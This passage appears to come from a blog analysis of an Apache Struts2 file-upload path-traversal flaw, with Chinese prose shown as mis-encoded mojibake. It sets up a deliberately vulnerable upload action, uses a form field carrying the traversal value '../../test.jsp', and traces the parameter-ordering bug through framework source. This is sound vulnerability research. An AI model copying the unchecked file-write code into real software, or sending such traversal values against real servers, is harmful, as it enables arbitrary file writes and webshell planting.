&lt;version&gt;2.5.33&lt;/version&gt;--&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">&lt;!-- Servlet API --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¼–è¾‘<code>web.xml</code>æ–‡ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨webappç›®å½•ä¸‹åˆ›å»º<code>upload.jsp</code>æ–‡ä»¶</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: hejixiong</span><br><span class="line">  Date: <span class="number">2025</span>/<span class="number">4</span>/<span class="number">25</span></span><br><span class="line">  Time: <span class="number">10</span>:<span class="number">49</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;/upload&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;uploadFileName&quot;</span> value=<span class="string">&quot;../../test.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ä¸Šä¼ &quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>åœ¨<code>resources</code>ç›®å½•ä¸‹åˆ›å»º<code>struts.xml</code>æ–‡ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;default&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;upload&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.example.demo.UploadAction&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;fileUpload&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;maximumSize&quot;</span>&gt;</span>52428800<span class="tag">&lt;/<span class="name">param</span>&gt;</span> <span class="comment">&lt;!-- é™åˆ¶æ–‡ä»¶å¤§å°ä¸º50MB --&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">interceptor-ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">&quot;defaultStack&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>/error.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨<code>java</code>ç›®å½•ä¸‹åˆ›å»º<code>UploadAction.java</code>ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.dispatcher.multipart.UploadedFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UploadedFile upload;</span><br><span class="line">    <span class="keyword">private</span> String uploadFileName;</span><br><span class="line">    <span class="keyword">private</span> String uploadContentType;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> UploadedFile <span class="title function_">getUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpload</span><span class="params">(UploadedFile upload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.upload = upload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadFileName</span><span class="params">(String uploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadFileName = uploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUploadContentType</span><span class="params">(String uploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.uploadContentType = uploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;uploadFileName:&quot;</span> + uploadFileName);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadFileName);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file);</span><br><span class="line">        <span class="type">File</span> <span class="variable">content</span> <span class="operator">=</span> (File) upload.getContent();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(content);</span><br><span class="line">        <span class="type">byte</span>[] fileContent = Files.readAllBytes(content.toPath());</span><br><span class="line">        fileOutputStream.write(fileContent);</span><br><span class="line">        fileOutputStream.flush();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é…ç½®è°ƒè¯•ç¯å¢ƒ<br>åœ¨ideaé«˜çº§ç‰ˆä¸­ç”±å†…ç½®çš„tomcatè°ƒè¯•å™¨ï¼Œé€‰æ‹©æ·»åŠ åæŒ‰ç…§ä¸‹å›¾é…ç½®<br><img src="/archives/fe8a0a5d/img.png" alt="img.png"><br>é…ç½®åº”ç”¨ä¸Šä¸‹æ–‡ä¸º<code>/</code><br><img src="/archives/fe8a0a5d/img_1.png" alt="img_1.png">  </p>
<h1 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h1><p>è¯¥æ¼æ´å› <code>org.apache.struts2.interceptor.FileUploadInterceptor</code>è€Œèµ·ï¼Œæˆ‘ä»¬ä¹Ÿä»è¿™ä¸ªç±»å¼€å§‹åˆ†æ  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line"></span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) ac.get(ServletActionContext.HTTP_REQUEST);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(request <span class="keyword">instanceof</span> MultiPartRequestWrapper)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">ActionProxy</span> <span class="variable">proxy</span> <span class="operator">=</span> invocation.getProxy();</span><br><span class="line">                LOG.debug(getTextMessage(<span class="string">&quot;struts.messages.bypass.request&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;proxy.getNamespace(), proxy.getActionName()&#125;));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> invocation.invoke(); <span class="comment">// è¿™é‡Œéœ€è¦å°†requeståŒ…è£…æˆMultiPartRequestWrapperå¯¹è±¡ è¿™æ ·åœ¨è·å–è¯·æ±‚å‚æ•°çš„æ—¶å€™å‚èƒ½è·å–åˆ°formè¡¨å•é‡Œçš„å‚æ•°</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ValidationAware</span> <span class="variable">validation</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction(); <span class="comment">// å¾—åˆ°UploadAction</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> ValidationAware) &#123;</span><br><span class="line">            validation = (ValidationAware) action;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">MultiPartRequestWrapper</span> <span class="variable">multiWrapper</span> <span class="operator">=</span> (MultiPartRequestWrapper) request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (multiWrapper.hasErrors() &amp;&amp; validation != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TextProvider</span> <span class="variable">textProvider</span> <span class="operator">=</span> getTextProvider(action);</span><br><span class="line">            <span class="keyword">for</span> (LocalizedMessage error : multiWrapper.getErrors()) &#123;</span><br><span class="line">                String errorMessage;</span><br><span class="line">                <span class="keyword">if</span> (textProvider.hasKey(error.getTextKey())) &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(error.getTextKey(), Arrays.asList(error.getArgs()));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    errorMessage = textProvider.getText(<span class="string">&quot;struts.messages.error.uploading&quot;</span>, error.getDefaultMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                validation.addActionError(errorMessage);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// bind allowed Files</span></span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">fileParameterNames</span> <span class="operator">=</span> multiWrapper.getFileParameterNames(); <span class="comment">// æ–‡ä»¶å‚æ•°  æˆ‘ä»¬åªä¸Šä¼ äº†ä¸€ä¸ªæ–‡ä»¶ æ‰€ä»¥è¿™é‡Œåªæœ‰ä¸€ä¸ª</span></span><br><span class="line">        <span class="keyword">while</span> (fileParameterNames != <span class="literal">null</span> &amp;&amp; fileParameterNames.hasMoreElements()) &#123;</span><br><span class="line">            <span class="comment">// get the value of this input tag</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">inputName</span> <span class="operator">=</span> (String) fileParameterNames.nextElement(); <span class="comment">// inputnameå³æˆ‘ä»¬formè¡¨å•ç±»å‹ä¸ºfileçš„inputæ ‡ç­¾çš„nameå±æ€§å€¼</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// get the content type</span></span><br><span class="line">            String[] contentType = multiWrapper.getContentTypes(inputName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isNonEmpty(contentType)) &#123;</span><br><span class="line">                <span class="comment">// get the name of the file from the input tag</span></span><br><span class="line">        <span class="comment">// è¿™é‡Œä¼šå°†multipartæ–‡ä»¶çš„é‚£éƒ¨åˆ†çš„filenameå±æ€§çš„å€¼è¿›è¡Œè§„èŒƒåŒ–ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨`/`ä¸`\`ï¼Œ</span></span><br><span class="line">        <span class="comment">// ç›´æ¥é€šè¿‡è¿™ä¸ªå‚æ•°è¿›è¡Œè·¯å¾„ç©¿è¶Šæ˜¯ä¸å¯è¡Œçš„</span></span><br><span class="line">                String[] fileName = multiWrapper.getFileNames(inputName);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (isNonEmpty(fileName)) &#123;</span><br><span class="line">                    <span class="comment">// get a File object for the uploaded File</span></span><br><span class="line">                    UploadedFile[] files = multiWrapper.getFiles(inputName);</span><br><span class="line">                    <span class="keyword">if</span> (files != <span class="literal">null</span> &amp;&amp; files.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        List&lt;UploadedFile&gt; acceptedFiles = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedContentTypes = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        List&lt;String&gt; acceptedFileNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(files.length);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">contentTypeName</span> <span class="operator">=</span> inputName + <span class="string">&quot;ContentType&quot;</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileNameName</span> <span class="operator">=</span> inputName + <span class="string">&quot;FileName&quot;</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; files.length; index++) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) &#123;</span><br><span class="line">                                acceptedFiles.add(files[index]);</span><br><span class="line">                                acceptedContentTypes.add(contentType[index]);</span><br><span class="line">                                acceptedFileNames.add(fileName[index]);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!acceptedFiles.isEmpty()) &#123;</span><br><span class="line">                            Map&lt;String, Parameter&gt; newParams = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">                            newParams.put(inputName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(inputName, acceptedFiles.toArray(<span class="keyword">new</span> <span class="title class_">UploadedFile</span>[acceptedFiles.size()])));</span><br><span class="line">                            newParams.put(contentTypeName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(contentTypeName, acceptedContentTypes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedContentTypes.size()])));</span><br><span class="line">                            newParams.put(fileNameName, <span class="keyword">new</span> <span class="title class_">Parameter</span>.File(fileNameName, acceptedFileNames.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[acceptedFileNames.size()])));</span><br><span class="line">                            <span class="comment">// å°†æ–‡ä»¶å†…å®¹ æ–‡ä»¶ç±»å‹  æ–‡ä»¶åæ”¾åˆ° newParams é‡Œååˆå°†å™¨æ·»åŠ åˆ°actionContextçš„paramså‚æ•°ä¸­</span></span><br><span class="line">                            <span class="comment">// æ¼æ´çš„å…³é”®ä¹Ÿåœ¨è¿™é‡Œ</span></span><br><span class="line">                            ac.getParameters().appendAll(newParams);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                        LOG.warn(getTextMessage(action, <span class="string">&quot;struts.messages.invalid.file&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">                    LOG.warn(getTextMessage(action, <span class="string">&quot;struts.messages.invalid.content.type&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;inputName&#125;));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// invoke action</span></span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬è°ƒè¯•åˆ°<code>appendAll</code>æ–¹æ³•é‡Œé¢æŸ¥çœ‹å„ä¸ªå˜é‡çš„å€¼  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> HttpParameters <span class="title function_">appendAll</span><span class="params">(Map&lt;String, Parameter&gt; newParams)</span> &#123;</span><br><span class="line">        parameters.putAll(newParams);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/archives/fe8a0a5d/img_2.png" alt="img_2.png"><br>é€šè¿‡è§‚å¯Ÿå¯çŸ¥ï¼ŒActionContextçš„parameterså˜é‡åœ¨è¿½åŠ å‰å°±å·²ç»åˆä¸€ä¸ªå…ƒç´ äº†ï¼Œè¿™ä¸ªå…ƒç´ æ¥è‡ªæˆ‘ä»¬æ–‡ä»¶ä¸Šä¼ æ—¶æ·»åŠ çš„ä¸€ä¸ªinputæ ‡ç­¾å…¶nameä¸º<code>uploadFileName</code>ï¼Œvalueä¸º<code>../../test.jsp</code><br>è¿™ä¸ªå…ƒç´ ä¸<code>UploadFileName</code>åªæœ‰é¦–å­—æ¯å¤§å°ä¸ä¸€æ ·ã€‚<br>å½“è¿½åŠ å®Œæˆå<code>parameters</code>æ‹¥æœ‰äº†4ä¸ªå…ƒç´ ï¼Œä¸”keyä¸º<code>uploadFileNameçš„å…ƒç´ ä½äºç¬¬ä¸€ä¸ª</code><br><img src="/archives/fe8a0a5d/img_5.png" alt="img_5.png"><br>å…³äº<code>FileUploadInterceptor</code>æ‹¦æˆªå™¨çš„ä»£ç åˆ†æè¿™é‡Œå°±å‘Šä¸€æ®µè½äº†ï¼Œå½“ç¨‹åºç»§ç»­è¿è¡Œä¼šè¿è¡Œåˆ°å¦ä¸€ä¸ªæ‹¦æˆªå™¨<code>ParametersInterceptor</code><br>è¯¥æ‹¦æˆªå™¨ä¸ºå½“å‰è¯·æ±‚å¯¹åº”çš„Actionå¯¹è±¡è®¾ç½®å±æ€§ã€‚  è®¾ç½®å±æ€§çš„æ–¹å¼æ˜¯é€šè¿‡<code>ActionContext</code>çš„<code>parameters</code>å±æ€§çš„å€¼å°†é¦–å­—æ¯å¤§å†™åä¸<code>set</code>æ‹¼æ¥ä½œä¸ºæ–¹æ³•åè¿›è¡Œå‘å°„è°ƒç”¨ã€‚<br>å¦‚ï¼šå±æ€§<code>uploadFileName</code>å¯¹åº”çš„æ–¹æ³•ä¸º<code>setUploadFileName</code>ï¼Œ<code>UploadFileName</code>å¯¹åº”çš„æ–¹æ³•ä¸º<code>setUploadFileName</code>ï¼Œè¿™ä¸¤ä¸ªå±æ€§å¯¹åº”çš„æ–¹æ³•ç›¸åŒï¼Œ<br>é‚£ä¹ˆè°ƒç”¨çš„å…ˆåé¡ºåºæ˜¯ä»€ä¹ˆï¼Œè°ƒç”¨æ˜¯å¦ä¼šå‡ºç°çŸ­è·¯ï¼Œé€‰æ‹©å“ªä¸€ä¸ªè¿›è¡Œè°ƒç”¨éƒ½æœ‰è®²ç©¶ã€‚ </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">doIntercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">action</span> <span class="operator">=</span> invocation.getAction();</span><br><span class="line">        <span class="keyword">if</span> (!(action <span class="keyword">instanceof</span> NoParameters)) &#123;</span><br><span class="line">        <span class="type">ActionContext</span> <span class="variable">ac</span> <span class="operator">=</span> invocation.getInvocationContext();</span><br><span class="line">        <span class="type">HttpParameters</span> <span class="variable">parameters</span> <span class="operator">=</span> retrieveParameters(ac);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (LOG.isDebugEnabled()) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Setting params &#123;&#125;&quot;</span>, getParameterLogMap(parameters));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parameters != <span class="literal">null</span>) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; contextMap = ac.getContextMap();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(contextMap, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(contextMap, <span class="literal">true</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(contextMap, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">ValueStack</span> <span class="variable">stack</span> <span class="operator">=</span> ac.getValueStack();</span><br><span class="line">        setParameters(action, stack, parameters);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        ReflectionContextState.setCreatingNullObjects(contextMap, <span class="literal">false</span>);</span><br><span class="line">        ReflectionContextState.setDenyMethodExecution(contextMap, <span class="literal">false</span>);</span><br><span class="line">        ReflectionContextState.setReportingConversionErrors(contextMap, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>setParameters</code>æ–¹æ³•ä¸­<code>parameters</code>è¢«ä¾æ¬¡éå†æ£€æŸ¥å‚æ•°åæ˜¯å¦ç¬¦åˆçº¦å®šï¼Œå¹¶å°†ç»“æœå­˜å‚¨åˆ°ä¸€ä¸ªæ–°çš„<code>treeMap</code>ä¸­ï¼Œæ­¤æ—¶4ä¸ªå‚æ•°çš„å…ˆåæ•°æ®å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">setParameters</span><span class="params">(<span class="keyword">final</span> Object action, ValueStack stack, HttpParameters parameters)</span> &#123;</span><br><span class="line">        HttpParameters params;</span><br><span class="line">        Map&lt;String, Parameter&gt; acceptableParameters;</span><br><span class="line">        <span class="keyword">if</span> (ordered) &#123;</span><br><span class="line">            params = HttpParameters.create().withComparator(getOrderedComparator()).withParent(parameters).build();</span><br><span class="line">            acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;(getOrderedComparator());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            params = HttpParameters.create().withParent(parameters).build();</span><br><span class="line">            acceptableParameters = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isAcceptableParameter(parameterName, action)) &#123;</span><br><span class="line">                acceptableParameters.put(parameterName, entry.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶æˆ‘ä»¬å‘ç°<code>uploadFileName</code> æ’åœ¨äº†<code>UploadFileName</code>çš„åé¢ï¼Œè¿™æ˜¯ä¸æ˜¯æ„å‘³ç€<code>uploadFileName</code>å¯¹åº”çš„<code>setUploadFileName</code>æ–¹æ³•å°†<code>UploadFilename</code>è®¾ç½®çš„å€¼è¦†ç›–æ‰å‘¢ï¼Ÿ<br><img src="/archives/fe8a0a5d/img_6.png" alt="img_6.png"><br><code>setParameters</code>æ–¹æ³•ä¸­æœ‰ä¸€æ®µä»£ç æ˜¯è¿™æ ·çš„ï¼Œå®ƒå°†<code>acceptableParameters</code>çš„æ¯ä¸ªå…ƒç´ ä¾æ¬¡éå†å‡ºæ¥ç„¶åè°ƒç”¨<code>newStack</code>çš„<code>setParameter</code>æ–¹æ³•ã€‚<br>è¿™é‡Œåœ¨è¿›è¡Œ<code>treeMap</code>éå†çš„æ—¶å€™æ˜¯æœ‰å›ºå®šçš„å…ˆåé¡ºåºï¼Œ<code>UploadFileName</code>ä¼šè¢«<code>uploadFileName</code>å…ˆéå†ã€‚  </p>
